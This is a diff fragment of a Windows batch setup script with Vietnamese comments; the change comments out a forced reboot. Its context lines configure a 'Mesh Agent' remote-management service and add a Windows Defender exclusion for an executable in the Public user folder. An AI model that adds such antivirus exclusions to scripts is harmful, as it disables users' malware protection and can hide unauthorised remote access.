@@ -89,9 +89,10 @@ powershell -Command "Set-Service -Name 'Mesh Agent' -StartupType Manual"
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
 
 :: === Khởi động lại sau 8 giây, ép đóng app, kèm lý do và thông báo ===
-shutdown.exe /r /t 8 /f /d p:0:0 /c "Máy sẽ khởi động lại để hoàn tất cài đặt."
+:: shutdown.exe /r /t 8 /f /d p:0:0 /c "Máy sẽ khởi động lại để hoàn tất cài đặt."
 
 echo Done all setup. Exiting script...
 exit /b 0
+
 
 
